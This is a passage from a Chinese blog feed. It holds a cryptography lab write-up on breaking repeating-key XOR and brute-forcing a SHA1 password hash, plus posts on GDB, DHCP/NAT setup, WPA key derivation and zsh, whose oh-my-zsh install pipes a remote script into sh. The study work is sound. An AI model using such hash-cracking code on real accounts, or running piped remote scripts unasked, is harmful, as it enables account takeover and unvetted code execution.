class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(x))])<br><br><span class="hljs-comment">#检测汉明距离计算函数是否正确</span><br>x = <span class="hljs-string">b&#x27;this is a test&#x27;</span><br>y = <span class="hljs-string">b&#x27;wokka wokka!!!&#x27;</span><br>expectedD = <span class="hljs-number">37</span><br>d = getHammingDistance(x, y)<br><span class="hljs-keyword">if</span> d != expectedD:<br>    <span class="hljs-keyword">raise</span> Exception(encodedD + <span class="hljs-string">&#x27; != &#x27;</span> + encodedExpectedD)<br></code></pre></td></tr></table></figure><p>先根据汉明距离，计算出汉明距离最小的keysize值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">normalizedEditDistance</span>(<span class="hljs-params">x, k</span>):<br>    blocks = [x[i:i+k] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x), k)][<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>    pairs = <span class="hljs-built_in">list</span>(itertools.combinations(blocks, <span class="hljs-number">2</span>))<br>    scores = [getHammingDistance(p[<span class="hljs-number">0</span>], p[<span class="hljs-number">1</span>])/<span class="hljs-built_in">float</span>(k) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pairs][<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(scores) / <span class="hljs-built_in">len</span>(scores)<br><br>k = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">41</span>), key=<span class="hljs-keyword">lambda</span> k: normalizedEditDistance(x, k))<br></code></pre></td></tr></table></figure><p>最终k值就是keysize<br>然后，取得keysize后，按照keysize对密文进行分块，然后对密文的每一个比特采用第三题的方法，猜出得分值最高的就是密钥，共需要keysize次循环即可找出相应的全部口令，函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">breakRepeatingKeyXor</span>(<span class="hljs-params">x, k</span>):<br>    blocks = [x[i:i+k] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x), k)]<br>    transposedBlocks = <span class="hljs-built_in">list</span>(itertools.zip_longest(*blocks, fillvalue=<span class="hljs-number">0</span>))<br>    key = [challenge3.breakSingleByteXOR(<span class="hljs-built_in">bytes</span>(x))[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> transposedBlocks]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(key)<br><br>key = breakRepeatingKeyXor(x, k)<br>y = challenge5.encodeRepeatingKeyXor(x, key)<br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-comment">#write the result to file to look</span><br>result = y.decode()<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Dechallenge6.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(result)<br></code></pre></td></tr></table></figure><p>最后运行的结果为：<br>key &#x3D;  erminator X: Bring the noise<br>明文写入了文件，部分如下图：</p><p><img src="/images/crypto1-5.png"></p><h3 id="4-通过社会工程学，猜测用户口令，破解SHA1处理后的字符串"><a href="#4-通过社会工程学，猜测用户口令，破解SHA1处理后的字符串" class="headerlink" title="4.通过社会工程学，猜测用户口令，破解SHA1处理后的字符串"></a>4.通过社会工程学，猜测用户口令，破解SHA1处理后的字符串</h3><p>题目给了我们一个键盘使用痕迹和数据库存储的sha1值，我们需要猜测出明文：</p><p><img src="/images/crypto1-6.png"></p><p>我们根据键盘使用确定使用的字符，然后循环计算sha1值与题目给的sha1值比对即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br>hash1=<span class="hljs-string">&quot;67ae1a64661ac8b4494666f58c4822408dd0a3e4&quot;</span><br>str1=<span class="hljs-string">&quot;QqWw%58(=0Ii*+nN&quot;</span><br>str2=[[<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>],[ <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>],[ <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>], [<span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>],[ <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>], [<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>], [<span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>], [<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>]]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sha_encrypt</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    sha = hashlib.sha1(<span class="hljs-built_in">str</span>)<br>    encrypts = sha.hexdigest()<br>    <span class="hljs-keyword">return</span> encrypts<br>st3=<span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">8</span><br>str4=<span class="hljs-string">&quot;&quot;</span><br>str3=<span class="hljs-built_in">list</span>(st3)<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>    str3[<span class="hljs-number">0</span>]=str2[<span class="hljs-number">0</span>][a]<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>        str3[<span class="hljs-number">1</span>]=str2[<span class="hljs-number">1</span>][b]<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>            str3[<span class="hljs-number">2</span>]=str2[<span class="hljs-number">2</span>][c]<br>            <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>                str3[<span class="hljs-number">3</span>] = str2[<span class="hljs-number">3</span>][d]<br>                <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>                    str3[<span class="hljs-number">4</span>] = str2[<span class="hljs-number">4</span>][e]<br>                    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>                        str3[<span class="hljs-number">5</span>] = str2[<span class="hljs-number">5</span>][f]<br>                        <span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>                            str3[<span class="hljs-number">6</span>] = str2[<span class="hljs-number">6</span>][g]<br>                            <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>):<br>                                str3[<span class="hljs-number">7</span>] = str2[<span class="hljs-number">7</span>][h]<br>                                newS=<span class="hljs-string">&quot;&quot;</span>.join(str3)<br>                                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(newS, <span class="hljs-number">8</span>):<br>                                    str4 = sha_encrypt(<span class="hljs-string">&quot;&quot;</span>.join(i))<br>                                    <span class="hljs-keyword">if</span> str4==hash1:<br>                                        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;&quot;</span>.join(i)<br>                                        exit(<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><p>结果为：</p><p>(Q&#x3D;win*5</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过本次实验，我学会了通过赋分的方式遍历出最有可能的密钥值，学会了如何破解类维吉尼亚密码，学会了通过结合社会工程学的方法破解出用户口令的方法。</p><p>本次实验刚开始还很没有头绪，只知道遍历密钥不知道还有赋分这种模式，也不知道这种模式如何使用，然后去GitHub上参考了一波大佬们写的代码，顿时茅塞顿开，GitHub真是个好地方。其余python有关的库的使用问题百度基本就可解决所有问题。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://github.com/akalin/cryptopals-python3">https://github.com/akalin/cryptopals-python3</a><br><a href="https://blog.csdn.net/liuweiran900217/article/details/19933549">https://blog.csdn.net/liuweiran900217/article/details/19933549</a><br><a href="https://www.cnblogs.com/elpsycongroo/p/7669786.html">https://www.cnblogs.com/elpsycongroo/p/7669786.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>调试工具GDB的使用</title>
    <link href="/blog/2019/08/31/%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7GDB%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/blog/2019/08/31/%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7GDB%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>大三了，是时候定一下自己的方向了，还剩一年就要开始秋招了。准备向Linux内核和Linux嵌入式方向走，感觉未来物联网设备会走进千家万户，Linux嵌入式系统用途将会增加很多。既然选择了某个方向，有了目标之后就义无反顾的走下去吧！</strong></p><p><img src="/images/fj21.jpg"></p><span id="more"></span><h3 id="GDB使用实例"><a href="#GDB使用实例" class="headerlink" title="GDB使用实例"></a>GDB使用实例</h3><h4 id="1-进入gdb"><a href="#1-进入gdb" class="headerlink" title="1.进入gdb"></a>1.进入gdb</h4><p>使用gcc编译源文件时，加上-g选项，之后使用 gdb  +  编译之后的文件名即可进入(gdb)开头的命令行界面了。如下图：</p><p><img src="/images/gdb1.png"></p><h4 id="2-查看文件"><a href="#2-查看文件" class="headerlink" title="2.查看文件"></a>2.查看文件</h4><p>在gdb中键入 ‘l’(list)就可以查看载入文件，如下图所示：</p><p><img src="/images/gdb2.png"></p><p>注意：一般情况下源代码中的行号与用户书写的行号是一致的，但有时由于用户的某些编译选项会导致行号不一样的情况，因此，一定要查看在gdb中的行号。</p><h4 id="3-设置断点"><a href="#3-设置断点" class="headerlink" title="3.设置断点"></a>3.设置断点</h4><p>设置断点可以使程序到达一定的位置暂停它的运行，程序员在该位置可以方便地查看变量的值、堆栈等情况，从而找出代码的症结所在。</p><p>在gdb中设置断点非常简单，只需要在“b”后加入对应的行号即可。如下图：</p><p><img src="/images/gdb3.png"></p><h4 id="4-查看断点处的情况"><a href="#4-查看断点处的情况" class="headerlink" title="4.查看断点处的情况"></a>4.查看断点处的情况</h4><p>在设置完成断点之后，用户可以键入”info b“来查看断点设置情况，在gdb中可以设置多个断点。</p><p><img src="/images/gdb4.png"></p><h4 id="5-运行代码"><a href="#5-运行代码" class="headerlink" title="5.运行代码"></a>5.运行代码</h4><p>接下来就可以运行代码了，gdb默认从首行开始运行代码，可键入”r”(run)即可，在r后面加上行号即可从程序中指定行开始运行。</p><p><img src="/images/gdb5.png"></p><p>可以看到，程序运行到断点处就停止了。</p><h4 id="6-查看变量值"><a href="#6-查看变量值" class="headerlink" title="6.查看变量值"></a>6.查看变量值</h4><p>在程序停止运行之后，程序员需要查看断点处的相关变量值。在gdb中只需键入“p + 变量值”即可，如下图所示：</p><p><img src="/images/gdb6.png"></p><h4 id="7-观察变量"><a href="#7-观察变量" class="headerlink" title="7.观察变量"></a>7.观察变量</h4><p>在某一循环处，我们往往需要观察一个变量的变化情况，这时候就需要键入命令“watch”来观察变量的变化情况，如下图所示：</p><p><img src="/images/gdb7.png"></p><h4 id="8-单步运行"><a href="#8-单步运行" class="headerlink" title="8.单步运行"></a>8.单步运行</h4><p>单步运行是指一次只运行一条语句，这样可以方便的查看程序运行结果，在此处只需要键入“n”(next)即可。</p><h4 id="9-程序的继续运行"><a href="#9-程序的继续运行" class="headerlink" title="9.程序的继续运行"></a>9.程序的继续运行</h4><p>命令“c”(continue)可以使gdb继续运行以下程序，再次遇到断点停止。</p><h4 id="10-退出gdb"><a href="#10-退出gdb" class="headerlink" title="10.退出gdb"></a>10.退出gdb</h4><p>退出gdb只需使用指令“q”（quit）即可。</p><h3 id="设置-x2F-删除断点"><a href="#设置-x2F-删除断点" class="headerlink" title="设置&#x2F;删除断点"></a>设置&#x2F;删除断点</h3><table><thead><tr><th align="center">命令格式</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">break+设置断点的行号</td><td align="center">用于在程序中对应行设置断点</td></tr><tr><td align="center">tbreak+行号或者函数名</td><td align="center">设置临时断点，到达后被自动删除</td></tr><tr><td align="center">break+filename+行号</td><td align="center">用于在指定文件的对应行设置断点</td></tr><tr><td align="center">break+&lt;0x…&gt;</td><td align="center">用于在内存某一位置处暂停</td></tr><tr><td align="center">break+行号+if条件</td><td align="center">用于设置条件断点，在循环中使用非常方便</td></tr><tr><td align="center">info breakpoints&#x2F;watchpoints</td><td align="center">查看断点&#x2F;观察点的情况</td></tr><tr><td align="center">clear+要清除的断点的行号</td><td align="center">清除对应行的断点</td></tr><tr><td align="center">disable+断点编号</td><td align="center">让断点暂时失效，enable可以使之生效</td></tr><tr><td align="center">awatch&#x2F;watch+变量</td><td align="center">设置一个观察点，当变量被读出或者写入时暂停</td></tr><tr><td align="center">rwatch+变量</td><td align="center">设置一个观察点，当变量被程序读时，程序被暂停</td></tr></tbody></table><h3 id="数据相关命令"><a href="#数据相关命令" class="headerlink" title="数据相关命令"></a>数据相关命令</h3><table><thead><tr><th align="center">命令格式</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">display+表达式</td><td align="center">该命令用于显示表达式的值，使用了该命令之后，每当程序运行到断点后都会显示表达式值</td></tr><tr><td align="center">info display</td><td align="center">用于显示当前所有要显示值的表达式的有关情况</td></tr><tr><td align="center">delete +display编号</td><td align="center">删除一个要显示值的表达式</td></tr><tr><td align="center">disable&#x2F;enable + display编号</td><td align="center">使一个要显示的表达式暂时无效&#x2F;有效</td></tr><tr><td align="center">whatis+变量</td><td align="center">显示某个表达式数据类型</td></tr><tr><td align="center">print(p)+变量或表达式</td><td align="center">打印某个变量或者表达式的值</td></tr><tr><td align="center">set+变量&#x3D;变量值</td><td align="center">改变程序中一个变量的值</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>GDB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu DHCP服务以及NET网桥的配置</title>
    <link href="/blog/2019/03/30/Ubuntu-DHCP%E6%9C%8D%E5%8A%A1%E4%BB%A5%E5%8F%8ANET%E7%BD%91%E6%A1%A5%E7%9A%84%E9%85%8D%E7%BD%AE/"/>
    <url>/blog/2019/03/30/Ubuntu-DHCP%E6%9C%8D%E5%8A%A1%E4%BB%A5%E5%8F%8ANET%E7%BD%91%E6%A1%A5%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p><strong>项目成功实现了允许多密钥同时接入AP，由于需要配置一下DHCP服务和网桥保证STA连接后可以正常使用，以便于后面进行权限的控制。</strong></p><p><img src="/images/fj20.jpg"></p><span id="more"></span><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li>Ubuntu 14.04</li><li>hostapd</li><li>isc-dhcp-server</li></ul><p>安装isc-dhcp-server：<br> <code>sudo apt-get install isc-dhcp-server</code></p><h2 id="开始配置"><a href="#开始配置" class="headerlink" title="开始配置"></a>开始配置</h2><h3 id="创建软AP"><a href="#创建软AP" class="headerlink" title="创建软AP"></a>创建软AP</h3><p>进入hostapd目录，执行以下命令运行hostapd:<br><code>sudo ./hostapd hostapd.conf</code></p><p>如果开启的时候，提示interface wlan0 wasn’t start，是因为你的wlan设备没有打开的原因。无线设备一般有三种状态，使用中，软锁定和硬锁定。其中软锁定就是关闭但可被软件激活，硬锁定则不可以。 输入下面两句命令，先关闭wifi，再软锁定wlan，最后重新打开hostapd即可。</p><p><code>sudo nmcli nm wifi off</code>(ubuntu14里面使用)<br><code>sudo nmcli radio wifi off</code>(ubuntu18里面使用)</p><p><code>sudo rfkill unblock wlan</code></p><h3 id="开启DHCP服务"><a href="#开启DHCP服务" class="headerlink" title="开启DHCP服务"></a>开启DHCP服务</h3><p>我们需要配置&#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf文件，添加要分配的网段，指明分配的地址范围，默认网关和DNS服务器地址。在文件最后我们添加以下内容。注意要分配的网段不能和主机eth0所处的网段相同。（我的主机处在192.168.52.140，所以我下面挑的是192.168.0.2&#x2F;24这段地址。）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">subnet</span> <span class="hljs-number">192.168.0.0</span> netmask <span class="hljs-number">255.255.255.0</span><br>&#123;<br><span class="hljs-attribute">range</span> <span class="hljs-number">192.168.0.2</span> <span class="hljs-number">192.168.0.250</span>;<br><br><span class="hljs-attribute">option</span> domain-name-servers <span class="hljs-number">8.8.8.8</span>;<br><span class="hljs-attribute">option</span> routers <span class="hljs-number">192.168.0.1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们配置无线接口wlan2所处的网段，注意要跟上面的配置一致：<br><code>sudo ifconfig wlan2 192.168.0.1 netmask 255.255.255.0</code></p><p>最后开启dhcp服务器即可:<br><code>sudo service isc-dhcp-server start</code></p><h3 id="开启NET"><a href="#开启NET" class="headerlink" title="开启NET"></a>开启NET</h3><p>SNAT，Source Network Address Translation<br>源地址转换，能够为内部客户端代理访问外部网络。目标地址和端口不变，源地址修改成对外可见的公网地址，端口随机生成，并将映射记录在NAT表中。当数据返回时，根据端口将目的地址修改成对应表项的IP地址和端口，这样可以解决多个设备共享一个公有IP上网的问题。</p><p>在这里，我们要用到的是SNAT，这可以借助iptables工具来实现。iptables能够帮助我们配置管理linux内部防火墙。我们首先打开转发功能，然后将192.168.52.140的地址修改为eth0的出口地址。然后还要改&#x2F;etc&#x2F;sysctl.conf<br>net.ipv4.ip_forward&#x3D;1这行的注释去掉</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> sysctl net.ipv4.ip_forward=<span class="hljs-number">1</span><br><span class="hljs-attribute">sudo</span> iptables -t nat -A POSTROUTING -s <span class="hljs-number">192.168.0.2</span>/<span class="hljs-number">24</span> -o eth0 -j MASQUERADE<br></code></pre></td></tr></table></figure><p>到此就完成了DHCP与NET的配置。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>DHCP</tag>
      
      <tag>hostapd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WPA四步握手中PMK以及PTK的派生</title>
    <link href="/blog/2019/03/21/WPA%E5%9B%9B%E6%AD%A5%E6%8F%A1%E6%89%8B%E4%B8%ADPMK%E4%BB%A5%E5%8F%8APTK%E7%9A%84%E6%B4%BE%E7%94%9F/"/>
    <url>/blog/2019/03/21/WPA%E5%9B%9B%E6%AD%A5%E6%8F%A1%E6%89%8B%E4%B8%ADPMK%E4%BB%A5%E5%8F%8APTK%E7%9A%84%E6%B4%BE%E7%94%9F/</url>
    
    <content type="html"><![CDATA[<p><strong>雨打梨花深闭门，忘了青春，误了青春</strong></p><p><img src="/images/fj19.jpg"></p><span id="more"></span><h2 id="hostapd中某些类型的参数输出格式"><a href="#hostapd中某些类型的参数输出格式" class="headerlink" title="hostapd中某些类型的参数输出格式"></a>hostapd中某些类型的参数输出格式</h2><p><strong>首先必须知道u8等数据类型的定义：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">char</span> s8;  <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> u8;  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">short</span> s16;  <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> u16;  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">int</span> s32;  <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u32;  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> s64;  <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> u64;  <br></code></pre></td></tr></table></figure><table><thead><tr><th align="center">数据类型</th><th align="center">打印格式</th></tr></thead><tbody><tr><td align="center">u8</td><td align="center">%d</td></tr><tr><td align="center">s8</td><td align="center">%d</td></tr><tr><td align="center">u16</td><td align="center">%d or %hu</td></tr><tr><td align="center">s16</td><td align="center">%d or %hd</td></tr><tr><td align="center">u32</td><td align="center">%u</td></tr><tr><td align="center">s32</td><td align="center">%d</td></tr><tr><td align="center">u64</td><td align="center">%llu</td></tr><tr><td align="center">s64</td><td align="center">%lld</td></tr><tr><td align="center">unsigned int</td><td align="center">%u</td></tr></tbody></table><h2 id="PMK的派生"><a href="#PMK的派生" class="headerlink" title="PMK的派生"></a>PMK的派生</h2><p>PMK获得</p><ol><li>WPA-PSK<br> PMK&#x3D;PSK&#x3D; pdkdf2_SHA1(passphrase,SSID,SSID lenth,4096)其中passphrase,SSID ,是身份验证前authenticator,和supplicant都应该知道的</li><li>802.1X+EAP中<br> PMK &#x3D;L(MSK, 0, 256)<br> MSK 需要通过802.1X交换获得</li></ol><p>  <img src="/images/8021X+EAP.jpg"></p><p>  其中EAP-Request&#x2F;Method 中Method 表示EAP认证的方式,如下:<br>    MD5 Challenge      EAP 中类似CHAP的认证方式<br>    GTC                原本打算与RSA SecurID之类的token card 一起使用<br>    EAP-TLS            以数字证书相互认证<br>    TTLS               隧道式TLS;以TLS加密保护较弱的身份验证方式<br>    PEAP               防护型EAP;以TLS加密保护较弱的EAP验证方式<br>    EAP-SIM            SIM卡方式进行身份验证<br>    MS-CHAP-V2<br>Method 之后如果认证成功,authenticator会发出EAP-Success表示授权使用连接端口<br>再接下来AP就可以立即使用EAPOL-Key消息将MSK发给supplicant,以后就和WPA-PSK一样用MSK最终导出PTK(MSK,PMK就是PTK的密钥生成密钥)</p><h2 id="PTK的派生"><a href="#PTK的派生" class="headerlink" title="PTK的派生"></a>PTK的派生</h2><h3 id="PTK的内容"><a href="#PTK的内容" class="headerlink" title="PTK的内容"></a>PTK的内容</h3><p>PTK包含3个部分，KCK（Key Confirmation Key），KEK（Key Encryption Key），TK（Temporal Key）。<br>PTK的总长度根据加密方式不同而不同。<br>当加密方式是TKIP时，PTK长512位，按顺序分别为KCK占128位，KEK占128位，TK占256位。<br>当加密方式是CCMP时，PTK长384位，按顺序分别为KCK占128位，KEK占128位，TK占128位。<br>KEK和KCK是给EAPOL-Key，也就是四次握手时，加密和完整性验证用的。TK用于后续的数据加密。<br>四次握手的报文都是基于EAPOL-Key的。EAPOL-Key的结构如下：</p><p><img src="/images/PTK1.png"></p><h3 id="PTK的生成"><a href="#PTK的生成" class="headerlink" title="PTK的生成"></a>PTK的生成</h3><p>生成PTK，需要5个必要元素，PMK，ANonce（Nonce 1），SNonce（Nonce 2），Authenticate MAC（MAC 1），Supplicant MAC（MAC 2）。如下图：<br><img src="/images/PTK2.png"></p><p>2个Nonce分别是Authenticator和Supplicant生成的随机数。<br>这张图里的输出包含4个部分，其实Data Encr和Data MIC合起来就是前面提到的TK。而EAPOL Encr&#x2F;MIC分别对应前面的KEK和KCK。</p>]]></content>
    
    
    
    <tags>
      
      <tag>hostapd</tag>
      
      <tag>802.11</tag>
      
      <tag>WPA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zsh的配置与使用以及grep的使用</title>
    <link href="/blog/2019/03/19/zsh%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Agrep%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/blog/2019/03/19/zsh%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Agrep%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>好久没写过博客了，最近一直在和hostapd纠缠不休，课也比较多。今天心血来潮写一篇~~~整好今天装了个挺好用的小工具zsh，记一下安装和配置，以及命令grep的使用命令</strong></p><p><img src="/images/fj17.jpg"></p><span id="more"></span><h1 id="Zsh"><a href="#Zsh" class="headerlink" title="Zsh"></a>Zsh</h1><h2 id="zsh介绍"><a href="#zsh介绍" class="headerlink" title="zsh介绍"></a>zsh介绍</h2><p>zsh被誉为shell中的极品，自然有他的道理。Zsh 官网：<a href="http://www.zsh.org/">http://www.zsh.org/</a>   它兼容 Bash，据传说 99% 的 Bash 操作 和 Zsh 是相同的。</p><h2 id="zsh安装"><a href="#zsh安装" class="headerlink" title="zsh安装"></a>zsh安装</h2><p>Ubuntu下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install zsh<br></code></pre></td></tr></table></figure><p><strong>使用 Zsh 扩展集合：oh-my-zsh</strong></p><ul><li>首先确保自己电脑中安装了git，若未安装先安装git</li><li>安装oh-my-zsh:<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>raw.github.com<span class="hljs-regexp">/robbyrussell/</span>oh-my-zsh<span class="hljs-regexp">/master/</span>tools/install.sh -O - | sh<br></code></pre></td></tr></table></figure></li><li>在以 root 用户为前提下，oh-my-zsh 的安装目录：&#x2F;root&#x2F;.oh-my-zsh</li><li>在以 root 用户为前提下，Zsh 的配置文件位置：&#x2F;root&#x2F;.zshrc</li><li>为 root 用户设置 zsh 为系统默认 shell：chsh -s &#x2F;bin&#x2F;zsh root</li><li>如果你要重新恢复到 bash：chsh -s &#x2F;bin&#x2F;bash</li><li>查看是否修改shell成功<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure></li><li>现在你关掉终端或是重新连上 shell，现在开头是一个箭头了</li></ul><h2 id="zsh配置"><a href="#zsh配置" class="headerlink" title="zsh配置"></a>zsh配置</h2><p>编辑配置文件：vim &#x2F;root&#x2F;.zshrc<br>具体怎么配置，作者在注释里面说的很清楚。<br>###推荐两个插件：###</p><ol><li>autojump</li></ol><ul><li><p>这个插件会记录你常去的那些目录，然后做一下权重记录，你可以用这个命令看到你的习惯：j –stat，如果这个里面有你的记录，那你就只要敲最后一个文件夹名字即可进入，比如我个人习惯的 program：j program，就可以直接到：&#x2F;usr&#x2F;program</p></li><li><p>插件官网：<a href="https://github.com/wting/autojump">https://github.com/wting/autojump</a></p></li><li><p>官网插件下载地址：<a 